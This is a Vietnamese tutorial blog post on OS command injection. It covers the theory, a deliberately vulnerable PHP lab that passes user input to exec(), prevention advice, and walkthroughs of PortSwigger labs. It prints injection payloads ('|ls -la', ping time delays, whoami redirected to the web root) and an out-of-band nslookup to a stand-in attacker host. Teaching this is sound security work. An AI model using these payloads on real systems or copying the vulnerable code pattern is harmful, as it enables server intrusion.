OS Command có lẽ đã không còn xa lạ với anh chị em khi sử dụng hệ điều hành bất cứ là windows hay là linux. 

Nhưng trong quá trình phát triển ra 1 ứng dụng, chúng ta sẽ phải có những lúc phải dùng những OS Command đấy (có thể là để tương tác file, v.v.v) vì chỉ có API hệ thống mới đáp ứng được yêu cầu như vậy.

Tuy nhiên, trong cái thuận tiện lại nảy sinh ra cái bất tiện, đó là OS Command Injection đã xuất hiện GIÚP việc thực hiện các OS command ngay cả khi được tác động từ “người dùng” nếu người lập trình viên không xác thực đầu vào kĩ càng.

Để hiểu thêm về cách tấn công này, hôm nay mình sẽ giới thiệu cho mọi người biết những thủ thuật cũng như là cách phòng chống tấn công OS Command Injection.

Chúng ta bắt đầu nhé!!!

# PHẦN LÝ THUYẾT
## 1. OS Command Injection là gì?
### 1.1 Khái Niệm
Theo lý thuyết thì OS Command Injection hay còn được gọi là Shell Injection, là một lỗ hổng bảo mật web cho phép kẻ tấn công có thể thực thi các lệnh hệ thống trên máy chủ đó khi đang chạy 1 dịch vụ nào đó.

Còn giải thích theo góc độ “chúa tể wibu” của mình thì bác nào xem Sword Art Online thì nó như kiểu “System Call” nha (hack game vcl luôn) :v

### 1.2 OS Command Injection có thể xuất hiện ở đâu?
Hầu như là tất cả các function mà có thực hiện 1 hàm execute shell ở dưới back-end nếu không được lọc đầu vào kĩ càng, kẻ tấn công sẽ có thể dễ dàng bypass qua và thực hiện những ý đồ đen tối :v

### 1.3 Nguyên nhân gây ra OS Command Injection
Có thể là vô tình hoặc cố ý.
Lập trình viên không lường trước được đầu vào mà người dùng sẽ nhập vào mà không lọc ra các chuỗi an toàn bằng whitelist mà cứ thế thực thi bất cứ những gì người dùng nhập vào.

=> Và kinh nghiệm ở đây là gì? Vâng, đó là không tin vào input của bố con thằng nào =))

Còn cố ý có thể là do cty nợ lương chẳng hạn :v hoặc do chúng ta build nên các bài lab.

## 2. Hacker có thể làm được gì nếu khai thác thành công lỗ hổng này?
Thông thường, kẻ tấn công có thể tận dụng lỗ hổng này để xâm phạm vào các phần khác của cơ sở hạ tầng lưu trữ, khai thác, lấy thông tin và có thể chuyển cuộc tấn công sang hệ thống khác bên trong tổ chức.
## 3. Blind OS command injection
Nhiều trường hợp OS command injection là **blind vulnerabilities**. Có nghĩa là đầu ra sẽ không trả về trong response và ouput sẽ không hiển thị trên màn hình (hay còn gọi là 1 lỗ hổng tàng hình).

Có vài kỹ thuật được dùng có thể sử dụng để xác định được blind OS command như sau:

### 3.1 Detecting blind OS command injection using time delays
Sử dụng time delays để xác định được blind vulnerabilities. Như tên gọi, nó là độ trễ, cho phép bạn xác nhận rằng lệnh này đã được thực thi hay chưa dựa vào thời gian mà ứng dụng cần để đáp ứng. 

Câu Lệnh ping huyền thoại sẽ đáp ứng tốt trong việc này, vì nó cho phép chỉ định gói ICMP cần gửi và thời gian để lệnh chạy:

Ví dụ với lệnh 
```bash
& ping -c 10 127.0.0.1 &
// Nếu trong 10s có phản hồi liên tục từ response thì thành công, còn ngược lại thì không thành công.
```


### 3.2 Exploiting blind OS command injection by redirecting output
Có nghĩa là khai thác lỗ hổng OS command bằng cách chuyển hướng đầu ra

Ví dụ thư mục gốc của website ở **/var/www/static** thì có thể thực hiện 1 lệnh như sau:
```bash
&whoami > /var/www/static/whoami.txt & 
```
Lệnh này để ghi tên của user hiện tại vào file **whoami.txt**

Rồi sau đó chúng ta có thể sử dụng browser truy cập vào ***http://url/whoami.txt*** để truy xuất tệp và xem output từ lệnh được inject vào.

### 3.3 Exploiting blind OS command injection using out-of-band (OAST) techniques
Sử dụng kỹ thuật OAST để khai thác Blind OS command

Có thể sử dụng một lệnh được đưa vào sẽ kích hoạt **out-of-band** với hệ thống mà bạn kiểm soát. 

Ví dụ: 
```bash 
& nslookup kgji2ohoyw.web-attacker.com &
```

Payload này sử dụng nslookup để phân giải tên miền. Kẻ tấn công có thể xác định xem đã thành công hay chưa bằng cách quan sát lệnh có đang được thực thi hay không.
## 4. Cách Inject OS command
Nhiều siêu ký tự bên trong shell có thể được sử dụng để thực hiện các cuộc tấn công OS command injection.

- Các dấu phân tách lệnh hoạt động trên cả hệ thống Windows và Unix:
    - &
    - &&
    - |
    - ||

- Các dấu phân tách lệnh sau chỉ hoạt động trên các hệ thống dựa trên Unix:
    - ;
    - Newline (0x0a or \n)
    - `
    - $
## 5. Ngăn chặn OS Command Injection
### 5.1 Giai đoạn đang phát triển
Nếu thực hiện OS command có lỗi thì không dùng command nữa là xong :v (nghĩa là không bao giờ gọi OS command từ lớp ứng dụng). 

Trong các trường hợp, có nhiều cách khác nhau để thực hiện chức năng cần thiết bằng cách sử dụng API trên nền tảng an toàn hơn. Nếu không thể tránh khỏi việc sử dụng các lệnh OS thì phải thực hiện xác thực đầu vào mạnh.
- Validate các giá trị được phép dựa trên whitelist.
- Chỉ chấp nhận đầu vào là một số
- Chỉ chấp nhận đầu vào chỉ có ký tự chữ và số, không có ký tự đặc biệt, khoảng trắng ….

Không bao giờ cố gắng sanitize input đầu vào bằng cách escaping shell metacharacters. Trong thực tế, điều này dễ xảy ra lỗi và dễ bị kẻ tấn công có kỹ thuật cao vượt qua.
### 5.2 Giai đoạn release
Nếu đã fix được hầu hết các bug OS Command Injection ở giai đoạn phát triển thì chúng ta sẽ cần 1 lớp phòng thủ nữa ở giai đoạn Release, đó là WAF (Web Application Firewall)

Tùy theo từng loại WAF có thể cấu hình khác nhau.
Ví dụ: đối với Palo Alto Networks thì chỉ cần bật Alert (cảnh báo), Prevent (Ngăn chặn) hoặc Ban (block IP)
![image.png](https://images.viblo.asia/261370d8-574d-428a-adba-a14a6ceb7021.png)

## 6. Build Lab OS Command Injection Bằng “IDOL” :V
Link lab: ***https://replit.com/@uzumaki2205/OS-Command-Injection***

Ví dụ ở đây mình có 1 form có các element là input (dùng để nhập tên idol) và 1 element là button (ấn vào để submit và search)
```html
<form name="OS" action="/" method="GET" style="margin: 20px">
    <input name="idol_name" class="input is-primary" type="text" style="width:400px"
           placeholder="Tên diễn viên (ví dụ: fukada, mikami)">
    <button type="submit" class="button is-primary" name="Search">TÌM IDOL</button>
  </form>
```

Ví dụ mình cần load tất cả ảnh của idol theo tên khi đã nhập vào input và ấn search sẽ hiện ra tất cả hình ảnh.

Cây thư mục mình sẽ tổ chức như sau:
![image.png](https://images.viblo.asia/4ae86b0d-0e9b-4278-b1ac-f9a502047573.png)
Theo lẽ thường thì khi load image chúng ta sẽ phải lấy ra tất cả các path của hình ảnh rồi gán vào src của thẻ img bằng 1 function nào đó.
 
 Nếu như cách code thông minh là sẽ loop các folder bên trong imgs để so sánh tên idol thì Ở ĐÂY CHÚNG TÔI KHÔNG LÀM THẾ :v
 
Vì đây là LAB nên mình sẽ sử dụng 1 hàm thực thi bằng shell của hệ thống.
```php
if( isset($_GET['Search'])) //Nếu có GET request gửi đến
{
  $com = $_GET['idol_name'];
  $row = exec('ls imgs/'. $com, $output, $error); // Lấy ra tất cả ảnh trong folder imgs

  if ($row == null || $_GET['idol_name'] == '')
    echo "No result for " . $_GET['idol_name'];
  else {
    while(list(,$row) = each($output)){
    // Echo ra từng thẻ img dựa theo path
        echo "<img src='imgs/" . $com . "/" . $row . "' alt='". $row . "'>";
        echo "<BR>";
    }
  }
}
?>
```

Có thể thấy, KHÔNG HỀ GIẢ TRÂN nha quý dị =)) 

Đoạn code trên sẽ thực hiện việc search thông qua tên folder bên trong imgs, nếu trùng tên sẽ thực hiện lệnh ls và tất cả giá trị trả về sẽ xem như là 1 mảng và cứ thế echo ra từng ảnh thôi.

Lúc search thành công sẽ trả ra từng ảnh như thế này
(Bác nào chưa biết thì đây là idol eimi fukada nha :v)
![image.png](https://images.viblo.asia/557698c5-f852-47d8-93e9-f4489c6d5cc1.png)

Nhưng mà nếu chúng ta thực hiện 1 đoạn lệnh pipeline được nối vào thì sẽ dính OS Command Injection ngay, có thể thực hiện được bất cứ đoạn lệnh nào thông qua đây.

![image.png](https://images.viblo.asia/b5456778-444b-491a-9a67-ae07cd7b076d.png)

# PHẦN THỰC HÀNH
Chúng ta sẽ bắt đầu sang PortSwigger để tiến hành bắt đầu bằng 5 bài lab cơ bản để hiểu thêm về cách hoạt động của OS Command Injection nha.
## 1. Lab Cơ Bản
Link: https://portswigger.net/web-security/os-command-injection/lab-simple

Đầu tiên, chúng ta sẽ được chuyển tới 1 trang bán hàng, khi ấn vào 1 sản phẩm và chuyển xuống cuối trang chúng ta sẽ thấy có mục ***check stock***, khi ấn vào website sẽ thực hiện 1 function nào đó trả về cho chúng ta số record mà nó tìm được trong db.

Chúng ta có thể sử dụng các lệnh như trong ***cheatsheet*** mình để ở dưới cuối bài viết.

Bắt đi request lúc check stock và thay đổi param thành 1 câu lệnh pipeline ra sau cùng để thực hiện
```productId=1&storeId=1|ls -la```

Lệnh ***ls -la*** là lệnh liệt kê danh sách file trong linux (vì server xử lý không kiểm tra giá trị truyền vào nên có thể truyền vào param như trên để thực hiện **OS command injection**)

Chúng ta sẽ nhận được list các file được liệt kê ra bằng lệnh ls

![image.png](https://images.viblo.asia/f13fd570-e3dc-4ff7-b3f7-5581e8ab9fc3.png)
![image.png](https://images.viblo.asia/d2bc4456-4759-4724-9d0d-21a9d1a158b0.png)

## 2.  Blind OS Command Injection (Time Delay)
Link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

Vào trang gửi feedback và fill các trường trong form tùy ý
![image.png](https://images.viblo.asia/d309447a-6a8b-47c0-aa38-f7b039bed4ae.png)

Params bắt được từ BurpSuite sẽ như thế này
```bash
POST /feedback/submit HTTP/1.1
…
csrf=FIwdWrfDmzfil3BRFdim3axmXxLD9LXo&name=123&email=sondeptrai%40gmail.com&subject=Test&message=Test
```

Lần này nếu thực hiện câu lệnh như lab trên thì sẽ không hiển thị ra gì cả, ta sẽ giả dụ đây là blink os command và thực hiện test thử.

Thực hiện inject lần lượt các dấu phân cách | vào từng param để biết được vị trí mà đoạn code thực hiện lỗi.

Tất cả đều submit thành công cho đến khi thực hiện đến chỗ subject thì
```bash
csrf=FIwdWrfDmzfil3BRFdim3axmXxLD9LXo&name=123&email=sondeptrai%40gmail.com|&subject=Test&message=Test
```
![image.png](https://images.viblo.asia/91abd4f8-2cd6-43fe-8df9-a03419d12322.png)

OK mình biết chỗ này error nên mình sẽ sử dụng lệnh ping kèm theo kí tự **||** (cái này same same như dấu hoặc (||) trong lập trình đấy, có nghĩa là nếu lệnh ở trước dấu này bị lỗi thì sẽ thực hiện lệnh ở sau và ngược lại) tại đây để thực thi câu lệnh ping.

```bash
Syntax: Ping -c <time> <ip>
```

```bash
csrf=FIwdWrfDmzfil3BRFdim3axmXxLD9LXo&name=123&email=sondeptrai%40gmail.com||ping+-c+10+127.0.0.1||&subject=Test&message=Test
// (dấu + để nối khoảng trắng vô nha)
```

Forward gói tin và sau khoảng 3 4s gì đó response sẽ tiếp tục tự trả về như thế này là đã inject thành công lệnh ping.

![image.png](https://images.viblo.asia/dbb6b254-4b23-4b2b-964d-bf63be14cb06.png)
![image.png](https://images.viblo.asia/2042c8a9-0ad6-4a12-b9a3-6b9f91339b79.png)

## Blind OS Command Injection (Output Redirection) 
link: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

Ở đây là **output redirection** nên ta sẽ phân tích source 1 chút, chúng ta sẽ thấy hình ảnh được load lên bởi ```src=/image?filename=something.jpg```
![image.png](https://images.viblo.asia/8d6a6c6a-0b47-4cdf-9bfe-521da19f535c.png)

Quay trở lại cái form feedback, chúng ta vẫn bắt lại request cũ và sửa lại thành
```bash
csrf=FIwdWrfDmzfil3BRFdim3axmXxLD9LXo&name=123&email=sondeptrai%40gmail.com||whoami>/var/www/images/output.txt||&subject=Test&message=Test 
// /var/www là folder chứa souce của web
```
```whoami>/var/www/images/output.txt``` để ghi tên user vào file **output.txt**

Quay ra trang chủ bắt 1 request load image và sửa lại tên filename thành tên file output.txt xem đã thực hiện thành công chưa.
![image.png](https://images.viblo.asia/83fe4a6c-140d-476f-9131-782bb56fc5cc.png)

Hoặc có thể sử dụng các lệnh OS như ***ls*** để list ra danh sách tập tin
![image.png](https://images.viblo.asia/9f9b4080-ad36-4779-b693-b9cbb7bdd24c.png)

## 4. Blind OS Command Injection (Out-of-band)
link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

Vẫn cách cũ nhưng lab này đã note là nên sử dụng **burp collaborator** (một công nghệ cho phép Burp phát hiện ra các lỗ hổng vô hình trên máy chủ) để poll ra những request connect tới (Vì không thể thấy được lỗi được hiển thị lên nên chúng ta phải check bằng cách này).

>Vào file -> Burp Collaborator Client sau đó copy to clipboard rồi paste vào đoạn nslookup tiến hành lookup tên miền.



Payload sẽ như này:
```
csrf=FIwdWrfDmzfil3BRFdim3axmXxLD9LXo&name=123&email=sondeptrai%40gmail.com||nslookup+địa chỉ burp collaborator||&subject=Test&message=Test
```

Ấn vào **Pool now** và chúng ta sẽ nhận được những request đã connect tới.

![image.png](https://images.viblo.asia/80b91014-11a7-42d8-b79b-2b82a69797f3.png)
![image.png](https://images.viblo.asia/13e29748-ca1e-4701-a4de-1d9ad518714e.png)

Ok vậy là đã có impact, chúng ta sẽ tiếp tục lab 5 để khai thác chúng.

## 5. Blind OS Command Injection (Out-of-band data exfiltration)
link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

Vẫn thực hiện lại cách như lab 4 và chúng ta sẽ lấy tên của user trước payload ub9z …. (là cái link burp collaborator) để submit kết quả (là thằng peter-ej7Hn0)
![image.png](https://images.viblo.asia/5c175b3e-e514-441b-8d9a-92d432883c90.png)
![image.png](https://images.viblo.asia/d5e9835c-e197-490c-b7a0-8675daf8cfb6.png)

# Tổng Kết
Vậy là mình đã tổng hợp lại gần như những gì cơ bản nhất của OS Command Injection, nếu mọi người thấy bài viết hay thì nhớ like + share và ấn nút sub... à nhầm Share cho mọi người cùng đọc là đủ rồi nha =)))
# Tài Liệu Tham Khảo
- PortSwigger: https://portswigger.net/web-security/os-command-injection
- Lab Demo: https://replit.com/@uzumaki2205/OS-Command-Injection
- Linux Command - Cheat Sheet: https://gist.github.com/riipandi/3097780